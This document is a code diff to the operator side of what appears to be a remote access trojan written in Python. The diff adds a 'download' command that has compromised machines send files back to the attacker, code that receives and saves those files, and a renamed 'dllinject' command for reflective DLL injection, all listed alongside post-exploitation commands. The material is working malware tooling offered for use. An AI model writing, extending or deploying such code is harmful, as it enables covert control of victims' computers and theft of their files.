@@ -621,7 +621,11 @@ Open Ports
                     shellmode = True
                     filetransfer()
                     shellmode = False
-                elif(main == "loadlibrary"):
+                elif(main == "download"):
+                    filename = input("[+] File : ")
+                    if(len(filename) > 0):
+                        self.SendData("fupload:"+filename)
+                elif(main == "dllinject"):
                     shellmode = True
                     DLLTransfer()
                     shellmode = False
@@ -659,7 +663,8 @@ Open Ports
                     -. taskkill - Kill Running Process.
                     -. host_sweep - Get all hostnames of scanned targets or specific IP (use -h to specify ip).
                     -. upload - Upload file.
-                    -. loadlibrary - Load library in memory.
+                    -. download - Download file.
+                    -. dllinject - Reflective DLL Injection. Load your own DLL.
 
                     POST Exploitation Specific 
                     ----------------------------------
@@ -704,11 +709,26 @@ Open Ports
                 break # Keyboard interrupt, Breaks the loop.
 
     def ClientThread(self):
+        
         """
         Receive data from client
         """
         global silent
         global shellmode
+
+        def uniquify(path):
+            """
+            Credits : https://stackoverflow.com/questions/13852700/create-file-but-if-name-exists-add-number/57896232#57896232
+            """
+            filename, extension = os.path.splitext(path)
+            counter = 1
+
+            while os.path.exists(path):
+                path = filename + " (" + str(counter) + ")" + extension
+                counter += 1
+
+            return path
+
         while(True):
             try:
                 client_data = self.client_socket.recv(1024).decode()
@@ -718,6 +738,13 @@ Open Ports
                     break 
 
                 self.Log(client_data)
+
+                try:
+                    indexof = clients.index(self.client_socket)
+                    ips = iplist[indexof]
+                except Exception as e:
+                    print("[X] Error : " + str(e))
+                    pass
 
                 if(client_data.startswith("OPENPORT")):
                     # OPENPORT:IP,Port
@@ -741,14 +768,33 @@ Open Ports
                         print(" |_ "+ Style.BRIGHT + Fore.GREEN + " OS " + Style.RESET_ALL + " : Windows (Just guessing)")
                     if(hostinfo not in self.remote_hosts_list):
                         self.remote_hosts_list.append(hostinfo)
-                    
+                
+                elif(client_data.startswith("FILE")):
+                    try:
+                        fileinfo = client_data.split(":") #FILE:filename.txt:555
+                        #print(fileinfo)
+                        filename = fileinfo[1]
+                        filesize = int(fileinfo[2])
+                        SaveFile = "downloads/"+ filename
+                        FinalF = uniquify(SaveFile)
+
+                        with open(FinalF, "wb") as incoming_file:
+                            data = self.client_socket.recv(4096)
+                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=filename, fd=FinalF))
+                            while(len(data) != filesize):
+                                data += self.client_socket.recv(filesize - len(data))  
+                                #print("data = " + str(len(data)) + " filesize = " + str(filesize))
+                                if not data: break
+                            incoming_file.write(data)
+                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloaded '{fl}' in '{fd}'".format(fl=filename, fd=FinalF))
+                    except Exception as e:
+                        print("[X] Error : " + str(e))
+                        pass
                 elif(shellmode == True):
                     print("\n"+client_data) # No other information
 
                 else:
                     if(silent == False):
-                        indexof = clients.index(self.client_socket)
-                        ips = iplist[indexof]
                         print("\n["+ Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] {ips} : ".format(ips = ips) + client_data)
                     
             except Exception as e:
